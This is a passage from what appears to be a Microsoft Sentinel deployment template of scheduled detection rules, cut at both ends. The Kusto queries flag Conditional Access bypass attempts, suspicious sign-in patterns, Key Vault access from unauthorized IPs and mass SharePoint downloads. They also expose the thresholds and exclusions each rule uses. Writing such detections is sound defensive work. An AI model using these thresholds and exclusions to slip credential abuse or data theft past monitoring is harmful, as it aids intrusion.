              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-193')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-193')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-193: [RBA] Azure AD - Conditional Access Rule Bypass Attempt",
          "description": "This alert identifies an attempt to Bypass conditional access rule(s) in Azure Active Directory. The ConditionalAccessStatus column value details if there was an attempt to bypass Conditional Access or if the Conditional access rule was not satisfied. MITRE: T1110 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let timeRange = ago(1d);\nlet threshold = 1;\nSigninLogs\n| where TimeGenerated >= timeRange\n| where ConditionalAccessStatus == 1 or ConditionalAccessStatus =~ 'failure'\n| where AuthenticationRequirement == 'multiFactorAuthentication'\n| extend OS = DeviceDetail.operatingSystem, Browser = DeviceDetail.browser \n| extend StatusCode = tostring(Status.errorCode), StatusDetails = tostring(Status.additionalDetails)\n| extend ConditionalAccessPol0Name = tostring(ConditionalAccessPolicies[0].displayName)\n| extend ConditionalAccessPol1Name = tostring(ConditionalAccessPolicies[1].displayName)\n| extend ConditionalAccessPol2Name = tostring(ConditionalAccessPolicies[2].displayName)\n| extend Status = strcat(StatusCode, ': ', ResultDescription) \n| where StatusCode !in (A193_EXCLUDED_STATUS_CODES)\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), Status = makelist(Status), StatusDetails = makelist(StatusDetails), IPAddresses = makelist(IPAddress), IPAddressCount = dcount(IPAddress) , CorrelationIds = makelist(CorrelationId) by UserPrincipalName, AppDisplayName, tostring(Browser), tostring(OS), Location, ConditionalAccessPol0Name, ConditionalAccessPol1Name, ConditionalAccessPol2Name\n| where IPAddressCount > threshold and StatusDetails !has 'MFA successfully completed'\n| mvexpand IPAddresses, Status, StatusDetails, CorrelationIds\n| extend Status = strcat(Status, ' ', StatusDetails)\n| summarize IPAddresses = make_set(IPAddresses, 5), Status = make_set(Status, 5) by StartTimeUtc, EndTimeUtc, AccountCustomEntity = UserPrincipalName, AppDisplayName, tostring(Browser), tostring(OS), Location, ConditionalAccessPol0Name, ConditionalAccessPol1Name, ConditionalAccessPol2Name, IPAddressCount\n| extend IPCustomEntity = tostring(IPAddresses)\n| project-away IPAddresses",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-191')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-191')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-191: [RBA] Azure AD - Successful and Fail from Different Locations",
          "description": "This alert identifies when a user account successfully logs onto an Azure App from one IP and within 10 mins failed to logon to the same App via a different IP. This may indicate a malicious attempt at password guessing based on knowledge of the users account. MITRE: T1078 Category: Azure AD tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let timeFrame = 1d;\nlet logonDiff = 10m;\nSigninLogs \n| where TimeGenerated between (startofday(ago(timeFrame))..endofday(ago(timeFrame)))\n| where ResultType == '0' \n| where AppDisplayName !in~ ('Office 365 Exchange Online', 'Skype for Business Online')\n| project\n    SuccessLogonTime = TimeGenerated,\n    UserPrincipalName,\n    SuccessIPAddress = IPAddress,\n    AppDisplayName,\n    SuccessIPBlock = strcat(split(IPAddress, '.')[0], '.', split(IPAddress, '.')[1])\n| join kind= inner (\n    SigninLogs \n    | where TimeGenerated between (startofday(ago(timeFrame))..endofday(ago(timeFrame)))\n    | where ResultType !in ('0', '50140') \n    | where ResultDescription !~ 'Other' \n    | where AppDisplayName !in ('Office 365 Exchange Online', 'Skype for Business Online')\n    | project\n        FailedLogonTime = TimeGenerated,\n        UserPrincipalName,\n        FailedIPAddress = IPAddress,\n        AppDisplayName,\n        ResultType,\n        ResultDescription\n    )\n    on UserPrincipalName, AppDisplayName \n| where SuccessLogonTime < FailedLogonTime\n    and FailedLogonTime - SuccessLogonTime <= logonDiff\n    and FailedIPAddress !startswith SuccessIPBlock\n| summarize FailedLogonTime = max(FailedLogonTime), SuccessLogonTime = max(SuccessLogonTime)\n    ,ReusltDescriptions=make_set(ResultDescription)\n    ,FailedIPAddresses=make_set(FailedIPAddress)\n    ,AppDisplayNames=make_set(AppDisplayName)\n    by\n    UserPrincipalName,\n    SuccessIPAddress\n| extend\n    timestamp = SuccessLogonTime,\n    AccountCustomEntity = UserPrincipalName,\n    IPCustomEntity = SuccessIPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11025')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11025')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11025: [RBA] Windows - Special Groups Have been Assigned to a New Logon",
          "description": "Generates an alert when special groups have been assigned to a new logon MITRE: T1098,T1484 Category: Windows Security tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 0m;\nlet start_time_historical = 60m;\nlet end_time_historical = 10m;\nlet alert_bin = 30m;\nlet end_time = now();\nlet EventIDList = dynamic([4964, 4908]);\nSecurityEvent\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where isnotempty(Account)\n| extend AccountCustomEntity=extract(@'\\\\(.*?)$',1,Account)\n| project TimeGenerated, AccountCustomEntity, Computer, Activity,IpAddress\n| project bv_dest_user = AccountCustomEntity\n  , bv_src_dvc = Computer\n  , bv_src_ip = IpAddress\n  , bv_start_time = TimeGenerated\n  , bv_vendor_action = Activity\n| mv-apply e = BV11025_CONFIGURATION.EXCLUSION on (\n    extend keys = bag_keys(e)\n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_dest_user_excluded = iff(bv_dest_user contains e.bv_dest_user and isnotempty(e.bv_dest_user), 1, 0)\n    | extend bv_src_dvc_excluded = iff(bv_src_dvc contains e.bv_src_dvc and isnotempty(e.bv_src_dvc), 1, 0)\n    | extend bv_vendor_action_excluded = iff(bv_vendor_action contains e.bv_vendor_action and isnotempty(e.bv_vendor_action), 1, 0)\n    | extend excluded_count = \n            bv_dest_user_excluded\n            + bv_src_dvc_excluded\n            + bv_vendor_action_excluded\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n  )\n  | extend ExcludedEvent = iff(excluded contains 'true', true, false)\n  | where not(ExcludedEvent)\n  | extend ExtendedDescription = strcat(\n    'bv_dest_user: ', bv_dest_user\n    ,'\\nbv_src_dvc: \\n* ', bv_src_dvc\n    ,'\\nbv_src_ip: \\n* ', bv_src_ip\n    ,'\\nbv_start_time: \\n* ', bv_start_time\n    ,'\\nbv_vendor_action: \\n* ', bv_vendor_action\n    )\n  | extend VictimEntity = pack_array(bv_dest_user) \n  | project bv_dest_user\n  , bv_src_dvc\n  , bv_src_ip\n  , bv_start_time\n  , bv_vendor_action\n  , ExtendedDescription\n  , VictimEntity\n  , RBAScore = 3",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1484"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Generates an alert when there are security-enabled monitored group changes over an observed period of time.\n\n{{ExtendedDescription}}\n\nMITRE: T1098 MITRE: T1484\nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": {
            "RBAScore": "RBAScore",
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-489')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-489')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-489: [RBA] Azure Activity - From Public IP",
          "description": "This alert identifies when an Azure activity occurs on public IPs MITRE: T1578 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1d;\nlet latency = 0d;\nlet end_time = now();\nlet alert_bin = 30m;\nlet global_config = dynamic({\n    'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV489_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV489_CONFIG['RBASCORE']),3.0);\nlet description = (table_parameter: (*)){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = parse_json(all_data[k])\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw', strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n            , isnotempty(array_sort_desc(pack_array(all_data[k]))[0]), strcat(k,': ', all_data[k])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n    table_parameter\n    | extend all_data = pack_all()\n    | mv-apply e = exclusions on (\n        extend keys = bag_keys(e)\n        | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n        | mv-apply k = keys to typeof(string) on (\n            extend list = split(e[k],',')\n            | mv-apply l = list to typeof(string) on (\n                extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                | mv-apply i = item to typeof(string) on (\n                    extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                    | summarize excluded_count = countif(compare)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_count = countif(item_excluded)\n                | extend item_excluded = excluded_count > 0\n            )\n            | summarize excluded_list_item = countif(item_excluded > 0)\n        )\n        | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n        | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n        | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n        | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n    | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n};\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n    ModifiedRBAScore > 10, 10.0\n    , ModifiedRBAScore <0.1, 0.1\n    , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet operationList = dynamic(['Microsoft.Network/publicIPAddresses/write']);\nAzureActivity\n| where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| extend Action = tostring(parse_json(Authorization).action)\n| extend OperationNameValue = iff(isempty(OperationNameValue), Action, OperationNameValue)\n| where OperationNameValue in~ (operationList)\n| where ActivityStatusValue in~ ('Succeeded', 'Success')\n| parse Caller with UserName '@' UserDNSDomain \n| where UserName !in~ (A489_ALLOWED_ACCOUNTS)\n| extend\n    bv_vendor_action = OperationNameValue,\n    bv_vendor_result = ActivityStatusValue,\n    bv_src_ip = CallerIpAddress   \n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-489')      \n| summarize bv_start_time = arg_max(TimeGenerated, *) by bv_src_user = UserName\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_src_user, bv_src_ip)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user, bv_src_ip)         \n| project-keep \n    bv_*,\n    Resource,\n    ResourceGroup,\n    SubscriptionId,\n    UserDNSDomain,\n    ExtendedDescription",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-489: [RBA] Azure Activity - From Public IP - {{bv_src_ip}}",
            "alertDescriptionFormat": "This alert identifies when an Azure activity occurs on public IPs\n\n{{ExtendedDescription}}\n\nMITRE: T1578\nCategory: Azure Activity\ntag: RBA     "
          },
          "customDetails": {
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-130')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-130')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-130: [RBA] O365 - Anomalous login followed by Teams action",
          "description": "Detects anomalous IP address usage by user accounts and then checks to see if a suspicious Teams action is performed. Query calculates IP usage Delta for each user account and selects accounts where a delta >= 90% is observed between the most and least used IP. To further reduce results the query performs a prevalence check on the lowest used IP's country, only keeping IP's where the country is unusual for the tenant (dynamic ranges) Finally the user accounts activity within Teams logs is checked for suspicious commands (modifying user privileges or admin actions) during the period the suspicious IP was active. MITRE: T1078,T1213 Category: Office 365 tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "//The bigger the window the better the data sample size, as we use IP prevalence, more sample data is better.\nlet timeRange = 14d;\n//The minimum number of countries that the account has been accessed from [default: 2]\nlet minimumCountries = 2;\n//The delta (%) between the largest in-use IP and the smallest [default: 90]\nlet deltaThreshold = 95;\n//The maximum (%) threshold that the country appears in login data [default: 10]\nlet countryPrevalenceThreshold = 10;\n//The time to project forward after the last login activity [default: 60min]\nlet projectedEndTime = 60min; \n//Get Teams successful signins globally\nlet signinData =\n  SigninLogs\n  | where TimeGenerated >= ago(timeRange)\n  | where AppDisplayName has 'Teams'\n  | where ConditionalAccessStatus =~ 'success'\n  | extend country = tostring(LocationDetails['countryOrRegion'])\n  | where isnotempty(country) and isnotempty(IPAddress);\n// Collect successful signins to teams\nlet loginEvents = \n  signinData\n  | summarize count(), country=any(country), make_list(TimeGenerated) by IPAddress, UserPrincipalName;\n//Calcualte delta between logins\nlet loginDelta =\n  loginEvents\n  | summarize max(count_), min(count_) by UserPrincipalName\n  | extend delta = toreal(max_count_ - min_count_) / max_count_ * 100\n  | where delta >= deltaThreshold;\n//Count number of countries used to sign in\nlet countryCount =\n  loginEvents\n  | summarize Countries = dcount(country) by UserPrincipalName;\n//Join delta and sign in counts to successful logins\nloginDelta\n| join kind=rightouter  (\n  loginEvents\n) on UserPrincipalName\n| join kind=rightouter (\n  countryCount\n) on UserPrincipalName\n//Check where the record meets the minimum required countries\n| where Countries >= minimumCountries\n| join kind=leftouter (\n      signinData\n      | summarize count() by country\n      | join (\n          //Now get the total number of logins from any country and join it to the previous count in a single table\n          signinData\n          | summarize count() by country\n          | summarize sum(count_), make_list(country)\n          | mv-expand list_country\n          | extend country = tostring(list_country)\n      ) on country\n      | summarize by country, count_, sum_count_\n      //Now calculate each countries prevalence within login events\n      | extend prevalence = toreal(count_) / toreal(sum_count_) * 100\n      | project-away sum_count_\n      | order by prevalence\n) on country\n//The % that suspicious country is prevalent in data, this can be configured, less than 10% is uncommon\n| where prevalence < countryPrevalenceThreshold\n| where min_count_ == count_\n//Login start and end times from the JSON object, this is the activity window the suspicious IP was active within\n| extend EventTimes = list_TimeGenerated\n| extend SuspiciousIP = IPAddress\n| project UserPrincipalName, SuspiciousIP, UserIPDelta = delta, SuspiciousLoginCountry = country, SuspiciousCountryPrevalence = prevalence, EventTimes\n//Teams join to collect operations the user account has performed within the given time range\n| join kind=inner( \nOfficeActivity\n| where OfficeWorkload == 'MicrosoftTeams'\n| extend Details=pack('Id', columnifexists('OfficeId', ''),  'OrganizationId', columnifexists('OrganizationId', ''), 'UserType', columnifexists('UserType', ''), 'UserKey', columnifexists('UserKey', ''), 'TeamGuid', columnifexists('TeamGuid', '')) \n  | where TimeGenerated >= ago(timeRange)\n  | where Operation in~ ('TeamsAdminAction', 'MemberAdded', 'MemberRemoved', 'MemberRoleChanged', 'AppInstalled', 'BotAddedToTeam')\n  | project Operation, UserId=tolower(UserId), OperationTime=TimeGenerated\n) on $left.UserPrincipalName == $right.UserId\n| mv-expand StartTime = EventTimes\n| extend StartTime = make_datetime(StartTime)\n//The end time is projected 60 minutes forward, in case actions took place within the last hour of the final login for the suspicious IP\n| extend ProjectedEndTime = make_datetime(StartTime + projectedEndTime)\n//Limit to operations carried out by the user account in the timeframe the IP was active\n| where OperationTime between (StartTime .. ProjectedEndTime)\n| project UserPrincipalName, SuspiciousIP, StartTime, ProjectedEndTime, OperationTime, Operation, SuspiciousLoginCountry, SuspiciousCountryPrevalence\n//Filter on suspicious actions\n| extend activitySummary = pack(tostring(StartTime), pack('Operation',tostring(Operation), 'OperationTime', OperationTime))\n| summarize make_bag(activitySummary) by UserPrincipalName, SuspiciousIP, SuspiciousLoginCountry, SuspiciousCountryPrevalence\n| extend IPCustomEntity = SuspiciousIP, AccountCustomEntity = UserPrincipalName",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1213"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-398')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-398')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-398: [RBA] Azure Key Vault - Operations from unauthorized IPs",
          "description": "This alert identifies specific Key Vault operations from IP addresses that are not on the authorized list. MITRE: T1210 Category: Azure Key Vault tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nAzureDiagnostics\n| where TimeGenerated between (ago(start_time+latency)..now()) and ingestion_time() > ago(start_time)\n| sort by TimeGenerated desc\n| where ResourceType =~ 'VAULTS'\n| extend CallerIPAddressFix = column_ifexists('CallerIPAddress', '')\n| extend ID = column_ifexists('id_s', '')\n| extend HttpStatusCode = column_ifexists('httpStatusCode_d', '')\n| extend ClientInfo = column_ifexists('clientInfo_s', '')\n| extend PropertiesNetwork = column_ifexists('properties_networkAcls_defaultAction_s', '')\n| extend IdentityClaim = column_ifexists('identity_claim_http_schemas_xmlsoap_org_ws_2005_05_identity_claims_upn_s', '')\n| extend ipAccess = case(\nparse_ipv4(CallerIPAddressFix) between (parse_ipv4('10.17.0.0').. parse_ipv4('10.17.255.255')),'Allowed', \nparse_ipv4(CallerIPAddressFix) between (parse_ipv4('10.18.0.0').. parse_ipv4('10.18.255.255')),'Allowed', 'Not Allowed')\n| where OperationName in (MONITORED_VAULT_OPERATIONS)\n| where ipAccess =~ 'Not Allowed'\n| where isnotempty(IdentityClaim)\n| extend ExtendedDescription = strcat('Azure key vault operation ', OperationName, ' was performed from IP address ', CallerIPAddressFix, ' by user account ',IdentityClaim)\n| project TimeGenerated, ExtendedDescription, OperationName, Resource, ResourceGroup, IPCustomEntity=CallerIPAddressFix, ID, HttpStatusCode, requestUri_s,Agent=ClientInfo,PropertiesNetwork,AccountCustomEntity=IdentityClaim",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "LateralMovement"
          ],
          "techniques": [
            "T1210"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert identifies specific Key Vault operations from IP addresses that are not on the authorized list.\n\n{{ExtendedDescription}}'\ntag: RBA\nCategory: Azure Key Vault\nMITRE: T1210  "
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-138')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-138')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-138: [RBA] O365 - SharePointFileOperation via previously unseen IPs",
          "description": "Identifies when the volume of documents uploaded to or downloaded from Sharepoint by new IP addresses exceeds a threshold (default is 100). MITRE: T1213 Category: Office 365 tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let threshold = 100;\nlet szSharePointFileOperation = 'SharePointFileOperation';\nlet szOperations = dynamic(['FileDownloaded']);\nlet historicalActivity =\nOfficeActivity\n| where TimeGenerated between(ago(14d)..ago(1d))\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| summarize historicalCount = count() by ClientIP;\nlet recentActivity = OfficeActivity\n| where TimeGenerated > ago(1d)\n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n| summarize recentCount = count() by ClientIP;\nrecentActivity | join kind= leftanti ( historicalActivity ) on ClientIP\n// More than 100 downloads/uploads from a new IP\n| where recentCount > threshold\n| join kind = rightsemi \n(OfficeActivity \n| where TimeGenerated >= ago(1d) \n| where RecordType =~ szSharePointFileOperation\n| where Operation in~ (szOperations)\n)\non ClientIP\n| where UserId !in ('app@sharepoint')\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), count() by RecordType, Operation, UserType, UserId, ClientIP, OfficeWorkload, Site_Url\n| extend AccountCustomEntity = UserId, IPCustomEntity = 